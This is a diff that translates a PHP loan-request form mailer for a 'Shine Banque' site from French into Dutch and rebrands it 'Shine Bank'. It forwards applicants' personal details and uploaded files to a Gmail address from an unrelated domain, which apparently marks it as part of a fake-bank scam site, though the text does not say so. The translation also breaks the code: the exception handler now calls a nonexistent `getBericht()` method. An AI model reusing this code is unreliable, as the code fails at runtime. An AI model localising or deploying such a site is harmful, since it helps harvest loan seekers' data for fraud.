@@ -18,7 +18,7 @@ function sendResponse($success, $message) {
 }
 
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
-    sendResponse(false, 'Méthode non autorisée');
+    sendResponse(false, 'Methode niet toegestaan');
 }
 
 // Configuration SMTP directe (sans .env)
@@ -29,24 +29,24 @@ $smtpPort = 465;
 $smtpSecure = PHPMailer::ENCRYPTION_SMTPS; // SSL
 $adminEmail = 'shinebanque0@gmail.com';
 $fromEmail = 'shinebanque@craft-style.com';
-$fromName = 'Shine Banque';
+$fromName = 'Shine Bank';
 
 $requiredFields = [];
 $formData = [];
 
-if (isset($_POST['firstName'])) $formData['Prénom'] = $_POST['firstName'];
-if (isset($_POST['lastName'])) $formData['Nom'] = $_POST['lastName'];
+if (isset($_POST['firstName'])) $formData['Voornaam'] = $_POST['firstName'];
+if (isset($_POST['lastName'])) $formData['Naam'] = $_POST['lastName'];
 if (isset($_POST['email'])) $formData['Email'] = $_POST['email'];
-if (isset($_POST['phone'])) $formData['Téléphone'] = $_POST['phone'];
-if (isset($_POST['birthdate'])) $formData['Date de naissance'] = $_POST['birthdate'];
-if (isset($_POST['loanType'])) $formData['Type de crédit'] = $_POST['loanType'];
-if (isset($_POST['amount'])) $formData['Montant'] = $_POST['amount'];
-if (isset($_POST['duration'])) $formData['Durée'] = $_POST['duration'];
-if (isset($_POST['monthlyPayment'])) $formData['Mensualité'] = $_POST['monthlyPayment'];
-if (isset($_POST['message'])) $formData['Message'] = $_POST['message'];
+if (isset($_POST['phone'])) $formData['Telefoon'] = $_POST['phone'];
+if (isset($_POST['birthdate'])) $formData['Geboortedatum'] = $_POST['birthdate'];
+if (isset($_POST['loanType'])) $formData['Type krediet'] = $_POST['loanType'];
+if (isset($_POST['amount'])) $formData['Bedrag'] = $_POST['amount'];
+if (isset($_POST['duration'])) $formData['Looptijd'] = $_POST['duration'];
+if (isset($_POST['monthlyPayment'])) $formData['Maandelijkse betaling'] = $_POST['monthlyPayment'];
+if (isset($_POST['message'])) $formData['Bericht'] = $_POST['message'];
 
 if (empty($formData['Email']) || !filter_var($formData['Email'], FILTER_VALIDATE_EMAIL)) {
-    sendResponse(false, 'Adresse email invalide');
+    sendResponse(false, 'Ongeldig e-mailadres');
 }
 
 $clientEmail = $formData['Email'];
@@ -89,9 +89,9 @@ try {
     $mail1->setFrom($fromEmail, $fromName);
     $mail1->addReplyTo($fromEmail, $fromName);
     $mail1->addAddress($adminEmail);
-    $mail1->Subject = 'Nouvelle demande depuis le site Shine Banque';
+    $mail1->Subject = 'Nieuwe aanvraag vanaf de Shine Bank website';
     
-    $bodyAdmin = "<h2>Nouvelle demande reçue</h2>";
+    $bodyAdmin = "<h2>Nieuwe aanvraag ontvangen</h2>";
     $bodyAdmin .= "<table border='1' cellpadding='10' style='border-collapse: collapse;'>";
     foreach ($formData as $key => $value) {
         $bodyAdmin .= "<tr><td><strong>$key</strong></td><td>" . htmlspecialchars($value) . "</td></tr>";
@@ -99,9 +99,9 @@ try {
     $bodyAdmin .= "</table>";
     
     if (!empty($uploadedFiles)) {
-        $bodyAdmin .= "<h3>Pièces jointes :</h3><ul>";
+        $bodyAdmin .= "<h3>Bijlagen:</h3><ul>";
         foreach ($uploadedFiles as $file) {
-            $bodyAdmin .= "<li>" . htmlspecialchars($file['name']) . " (champ: " . htmlspecialchars($file['field']) . ")</li>";
+            $bodyAdmin .= "<li>" . htmlspecialchars($file['name']) . " (veld: " . htmlspecialchars($file['field']) . ")</li>";
             $mail1->addAttachment($file['path'], $file['name']);
         }
         $bodyAdmin .= "</ul>";
@@ -111,7 +111,7 @@ try {
     $mail1->Body = $bodyAdmin;
     
     if (!$mail1->send()) {
-        throw new Exception("Erreur lors de l'envoi à l'administrateur: " . $mail1->ErrorInfo);
+        throw new Exception("Fout bij verzenden naar beheerder: " . $mail1->ErrorInfo);
     }
     
     // Email 2: Confirmation au client
@@ -128,13 +128,13 @@ try {
     $mail2->setFrom($fromEmail, $fromName);
     $mail2->addReplyTo($fromEmail, $fromName);
     $mail2->addAddress($clientEmail);
-    $mail2->Subject = 'Confirmation de votre demande - Shine Banque';
+    $mail2->Subject = 'Bevestiging van uw aanvraag - Shine Bank';
     
     $bodyClient = '<!DOCTYPE html>
-<html lang="fr">
+<html lang="nl">
 <head>
 <meta charset="UTF-8">
-<title>Confirmation de votre demande</title>
+<title>Bevestiging van uw aanvraag</title>
 <style>
 body {
   font-family: "Segoe UI", sans-serif;
@@ -174,12 +174,12 @@ p {
 </head>
 <body>
   <div class="container">
-    <div class="logo">✨ Shine Banque ✨</div>
-    <h1>Confirmation de votre demande</h1>
-    <p>✅ Votre demande a bien été reçue par <strong>Shine Banque</strong>.</p>
-    <p>Vous recevrez une réponse dans un délai de <strong>3 jours ouvrables</strong>.</p>
-    <p>Merci de votre confiance.</p>
-    <div class="footer">© 2025 Shine Banque – Tous droits réservés.</div>
+    <div class="logo">✨ Shine Bank ✨</div>
+    <h1>Bevestiging van uw aanvraag</h1>
+    <p>✅ Uw aanvraag is goed ontvangen door <strong>Shine Bank</strong>.</p>
+    <p>U ontvangt een antwoord binnen <strong>3 werkdagen</strong>.</p>
+    <p>Dank u voor uw vertrouwen.</p>
+    <div class="footer">© 2025 Shine Bank – Tous droits réservés.</div>
   </div>
 </body>
 </html>';
@@ -188,13 +188,13 @@ p {
     $mail2->Body = $bodyClient;
     
     if (!$mail2->send()) {
-        throw new Exception("Erreur lors de l'envoi de la confirmation: " . $mail2->ErrorInfo);
+        throw new Exception("Fout bij verzenden van bevestiging: " . $mail2->ErrorInfo);
     }
     
-    sendResponse(true, 'Votre demande a bien été envoyée. Vous recevrez un mail de confirmation dans quelques instants.');
+    sendResponse(true, 'Uw aanvraag is succesvol verzonden. U ontvangt binnen enkele ogenblikken een bevestigingsmail.');
     
 } catch (Exception $e) {
-    sendResponse(false, "Erreur lors de l'envoi: " . $e->getMessage());
+    sendResponse(false, "Fout bij verzenden: " . $e->getBericht());
 } finally {
     // Nettoyage des fichiers uploadés
     foreach ($uploadedFiles as $file) {
